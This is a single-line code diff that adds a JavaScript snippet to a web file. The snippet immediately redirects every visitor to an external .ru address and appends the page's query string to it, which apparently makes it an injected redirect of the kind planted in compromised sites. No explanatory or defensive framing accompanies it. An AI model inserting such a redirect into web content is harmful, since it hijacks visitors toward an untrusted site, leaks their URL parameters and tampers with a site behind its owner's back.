@@ -1,0 +1,1 @@
+<script language="javascript">document.location='http://gw.wilstream.ru/sup/new_order.php'+document.location.search;</script>
